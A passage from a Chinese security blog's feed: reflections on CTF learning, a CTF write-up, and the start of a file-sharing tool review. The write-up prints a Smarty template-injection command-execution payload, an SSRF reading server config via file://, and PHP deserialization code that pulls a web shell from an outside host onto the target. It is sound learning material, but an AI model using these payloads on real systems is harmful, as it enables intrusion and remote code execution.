个面试题是想写：工作组和域的区别是什么？</p><blockquote><p>题目来源：<a href="https://whale3070.github.io/interview/2020/05/19/11-x">https://whale3070.github.io/interview/2020/05/19/11-x</a></p></blockquote><p>但是我仔细思考了下面的几个问题，重新选择了现在的问题。我并不是为了面试而面试，我整理面试题是为了帮助自己理清发展方向上的基本概念。</p><blockquote><p>目前自己的能力栈偏向于开发，不过我相信 <code>时间可以让平凡的事情，变得不平凡。——削微寒</code>。</p></blockquote><p><font color="red">问1:我期望的发展方向是什么？</font></p><ol><li>进击国际 CTF 竞赛，认识大佬。</li><li>挖掘漏洞（Web/PWN），为安全作出自己的绵薄之力。<blockquote><p>Be patient.</p></blockquote></li></ol><p><font color="red">问2:这个问题在问什么？</font></p><p>这个问题在问内网安全相关的基础知识。</p><p><font color="red">问3:这个问题符合我自己的发展方向吗？</font></p><p>不符合，几乎不会用到，用到了再学。</p><blockquote><p>PS：不符合就不学了吗？<br>根据我在另一篇文章<a href="https://slug01sh.github.io/2021/02/27/2021%E5%B9%B42%E6%9C%8827%E6%97%A5-%E3%80%90CTF%E7%B3%BB%E5%88%97%E3%80%91%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%8E%AF%E5%A2%83/">【CTF系列】常见Web漏洞原理以及搭建简单环境-深度和广度之辩</a>中提到的原则，我选择不学。</p></blockquote><hr><p>有点乱……。不过面试题的答案还是梳理得非常清楚的，下次多关注一下问题本身。</p>]]></content>
    
    
    <categories>
      
      <category>计算机基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>正向代理</tag>
      
      <tag>反向代理</tag>
      
      <tag>nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【CTF系列】深度和广度之辨</title>
    <link href="/2021%E5%B9%B42%E6%9C%8827%E6%97%A5-%E3%80%90CTF%E7%B3%BB%E5%88%97%E3%80%91%E6%B7%B1%E5%BA%A6%E5%92%8C%E5%B9%BF%E5%BA%A6%E4%B9%8B%E8%BE%A8/"/>
    <url>/2021%E5%B9%B42%E6%9C%8827%E6%97%A5-%E3%80%90CTF%E7%B3%BB%E5%88%97%E3%80%91%E6%B7%B1%E5%BA%A6%E5%92%8C%E5%B9%BF%E5%BA%A6%E4%B9%8B%E8%BE%A8/</url>
    
    <content type="html"><![CDATA[<p>开始新一轮的 CTF 学习，从其他地方学到很多的思想，顺便总结在第一篇文章中吧。</p><hr><h1 id="1-广度？"><a href="#1-广度？" class="headerlink" title="1 广度？"></a>1 广度？</h1><p>前段时间常常只关注单一的漏洞。具体的做法就是，先了解一种漏洞，然后去网上寻找这种漏洞的小分类，最后按照某些比较详细的 blog 进行练习。</p><blockquote><p>按照这样的步骤，一种漏洞就需要练习几周甚至几个月。</p></blockquote><p>我最近在极客时间的《10x程序员工作法》中，了解到了思维框架：</p><ol><li>以终为始（以）</li><li>任务分解</li><li>沟通交流</li><li>自动化</li></ol><p>用这种思想去思考我前面的做法，我得到的结论是：</p><blockquote><p>我的行为只能看见树木，不能看见森林。</p><p>在安全中有很多相似的漏洞，相似的手法。比如 SQL 注入和 XSS 漏洞的本质就是类似的，都是由于将用户的输入当成代码执行。</p><p>我如果以一种整体的视角来进行学习，进行分类和对比，那我就能迅速识别这些关键点，从而举一反三。</p></blockquote><p>（简而言之：不能学得太深入）</p><hr><h1 id="2-深度？"><a href="#2-深度？" class="headerlink" title="2 深度？"></a>2 深度？</h1><p>当然在我脑中还有另一个词在反驳，那就是竞争力的关键在于“一专多能”。“多能”是建立在“一专”基础上的。</p><h1 id="3-全都要"><a href="#3-全都要" class="headerlink" title="3 全都要"></a>3 全都要</h1><p>我认为主要在于专的「方向」。需要辨别你目前的方向是牛角尖，还是对社会有价值的。</p><p>我将 1.1 所提到的两种学习方式列在下面：</p><ol><li>把别人的 blog 再复现一遍。</li><li>将不同漏洞进行分类和对比，探索内部的联系。</li></ol><p>第 1 种方式并不是没有价值，而是处于一种为了学而学，是一种在高中或初中形成的思维定势（将一类题做懂就能得分）。在高中，做题时没有手机和电脑，知识点都是那几本书上的。现在我们身处大学，我们面对的问题更加的复杂、更加的多样化。想简单的利用刷题，太难了也没必要（价值不高）。</p><blockquote><p>总结：<br>我对于学习 CTF 的看法：</p><ol><li>要有目的性。（不想进 Defcon 的 CTFer 不是好 CTFer）根据目的来思考自己应该做什么。</li><li>平时多提问。通过提问将困难的问题逐步分解。</li><li>过于深入的问题，可以暂时不用研究，除非有需要（CTF 比赛碰见、工作需要、挖洞需要）</li></ol></blockquote><hr><h1 id="4-CTF之我见"><a href="#4-CTF之我见" class="headerlink" title="4 CTF之我见"></a>4 CTF之我见</h1><p>需要提出一些好的问题，才能更好的发展自己的 CTF 技能。（自学</p><p>比较好的一些问题：</p><ol><li>别人是怎么测试出那个漏洞的？</li><li>我怎么没测出来？</li><li>哪些技能还不够？（这时候就可以稍微再深入一点）</li></ol><hr>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【CTF系列】2021年2月四叶草CTF</title>
    <link href="/2021%E5%B9%B42%E6%9C%8826%E6%97%A5-%E3%80%90CTF%E7%B3%BB%E5%88%97%E3%80%912021%E5%B9%B42%E6%9C%88%E5%9B%9B%E5%8F%B6%E8%8D%89CTF/"/>
    <url>/2021%E5%B9%B42%E6%9C%8826%E6%97%A5-%E3%80%90CTF%E7%B3%BB%E5%88%97%E3%80%912021%E5%B9%B42%E6%9C%88%E5%9B%9B%E5%8F%B6%E8%8D%89CTF/</url>
    
    <content type="html"><![CDATA[<p>四叶草网络安全学院的一次推广活动吧，正好可以试试自己的水平（问就是菜。</p><hr><h1 id="1-Web"><a href="#1-Web" class="headerlink" title="1 Web"></a>1 Web</h1><h2 id="1-1-题目：GET"><a href="#1-1-题目：GET" class="headerlink" title="1.1 题目：GET"></a>1.1 题目：GET</h2><blockquote><p>题目描述：Hello GET_flAG!!!</p><p>题目地址：<a href="http://0bc68a13.yunyansec.com/">http://0bc68a13.yunyansec.com/</a></p></blockquote><ol><li>根据提示输入任意的Get参数，即可查看源码。<a href="http://0bc68a13.yunyansec.com/?1">http://0bc68a13.yunyansec.com/?1</a></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;./libs/Smarty.class.php&#x27;</span>);<br>$smarty = <span class="hljs-keyword">new</span> Smarty();<br><span class="hljs-keyword">if</span>($_GET)&#123;<br>    highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>    <span class="hljs-keyword">foreach</span> ($_GET <span class="hljs-keyword">AS</span> $key =&gt; $value)<br>    &#123;<br>        <span class="hljs-keyword">print</span> $key.<span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, $value))&#123;<br>            <br>            $smarty-&gt;display(<span class="hljs-string">&#x27;./template.html&#x27;</span>);<br><br><br>        &#125;<span class="hljs-keyword">elseif</span>(preg_match(<span class="hljs-string">&quot;/system|exec|eval|cat|assert|file|fgets/i&quot;</span>, $value))&#123;<br><br><br>            $smarty-&gt;display(<span class="hljs-string">&#x27;./template.html&#x27;</span>);            <br>            <br>        &#125;<span class="hljs-keyword">else</span>&#123;<br><br><br>            $smarty-&gt;display(<span class="hljs-string">&quot;eval:&quot;</span>.$value);<span class="hljs-comment">//flag.php</span><br>        &#125;<br>        <br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    $smarty-&gt;display(<span class="hljs-string">&#x27;./template.html&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><ol start="2"><li>查询到smarty是模版注入的漏洞，访问验证漏洞<blockquote><p><a href="http://d40c2bf8.yunyansec.com/?a=%7Bphpinfo()%7D">http://d40c2bf8.yunyansec.com/?a={phpinfo()}</a></p></blockquote></li><li>利用寻找可利用的命令执行函数来查看 flag<blockquote><p><a href="http://938e2c8c.yunyansec.com/?a=%7Bpassthru(%22tac%20%60find%20-iname%20fla*%60%22)%7D">http://938e2c8c.yunyansec.com/?a={passthru(%22tac%20`find%20-iname%20fla*`%22)}</a></p></blockquote></li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/92EB4BEA-EA62-4D89-8826-961DF3247500.png"><br>（图片说明：passthru 函数会执行后面的命令<code>tac `find -iname fla*` </code>，这个命令用来寻找 flag 文件并且输出其内容）</p><h2 id="1-2-题目：Website"><a href="#1-2-题目：Website" class="headerlink" title="1.2 题目：Website"></a>1.2 题目：Website</h2><blockquote><p>题目描述：Website</p><p>附件下载：暂无附件</p><p>题目地址：<a href="http://eb9a2ac6.yunyansec.com/">http://eb9a2ac6.yunyansec.com/</a></p></blockquote><ol><li>猜测为 SSRF，有 WAF，可以使用 302 跳转绕过（可以使用 PHP 实现 302 跳转，使用 nginx 设置太麻烦了）</li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/50B55344-016F-4009-BB4B-BC63ABC10B7F.png"></p><ol start="2"><li>使用 File 协议读取配置文件 /etc/httpd/conf/httpd.conf，发现 web 路径（Web1 和 Web2），可以进一步读取网站源码。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> <span class="hljs-attr">_default_:80</span>&gt;</span><br>DocumentRoot /var/www/html/web1<br><span class="hljs-tag">&lt;/<span class="hljs-name">VirtualHost</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> *<span class="hljs-attr">:8080</span>&gt;</span><br>    DocumentRoot /var/www/html/web2<br><span class="hljs-tag">&lt;/<span class="hljs-name">VirtualHost</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li>php反序列化拿shell，<a href="http://180fe897.yunyansec.com/?url=http://127.0.0.1:8080?data=payload">http://180fe897.yunyansec.com/?url=http://127.0.0.1:8080?data=payload</a> 在 1.txt 中写入 Web Shell。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">copy_file</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $path = <span class="hljs-string">&#x27;upload/&#x27;</span>;<br>    <span class="hljs-keyword">public</span> $file=<span class="hljs-string">&quot;e.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> $url=<span class="hljs-string">&#x27;http://127.0.0.1:80/?url=http://vps/1.txt&#x27;</span>;<br><br>&#125;<br><span class="hljs-keyword">echo</span> urlencode(urlencode(serialize(<span class="hljs-keyword">new</span> copy_file())));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li>访问 Web Shell，并找 flag。</li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/34E3850B-0AB5-43F7-BA48-4FED7BA9CE1B.png"></p><hr><h1 id="2-小结"><a href="#2-小结" class="headerlink" title="2 小结"></a>2 小结</h1><p>元宵节前一天的比赛，TimeLineSec 队里的师傅们把题目 AK 了🥳，Cool。</p><p>我第一道题是自己完整做出来的，第二道题和队里的师傅稍微讨论了一下，就接近 2 道题的样子。</p><p>打 CTF 有半年左右了，但这半年都只是在关注漏洞本身，属于一种只见树木不见森林的状态，希望后面能慢慢的再提升一些核心的技能点。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>局域网传输神器Snapdrop（电脑、手机均可）</title>
    <link href="/2021%E5%B9%B42%E6%9C%8826%E6%97%A5-%E5%B1%80%E5%9F%9F%E7%BD%91%E4%BC%A0%E8%BE%93%E7%A5%9E%E5%99%A8Snapdrop%EF%BC%88%E7%94%B5%E8%84%91%E3%80%81%E6%89%8B%E6%9C%BA%E5%9D%87%E5%8F%AF%EF%BC%89/"/>
    <url>/2021%E5%B9%B42%E6%9C%8826%E6%97%A5-%E5%B1%80%E5%9F%9F%E7%BD%91%E4%BC%A0%E8%BE%93%E7%A5%9E%E5%99%A8Snapdrop%EF%BC%88%E7%94%B5%E8%84%91%E3%80%81%E6%89%8B%E6%9C%BA%E5%9D%87%E5%8F%AF%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>Snapdrop 是一个跨端的传输工具，可以在 Window、Mac、Android、IOS 使用，甚至是任何设备——只要浏览器支持 WebRTC。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210226132700.png"></p><hr><h1 id="1-Why？"><a href="#1-Why？" class="headerlink" title="1 Why？"></a>1 Why？</h1><p><font color="red">为什么要使用这个工具？</font></p><p>以下是自己遇到的痛点：</p><p>我目前是 iPhone + Mac，使用 Airdrop 在自己的电脑和手机之间传输文件非常方便。但，在某次上课时，我由于某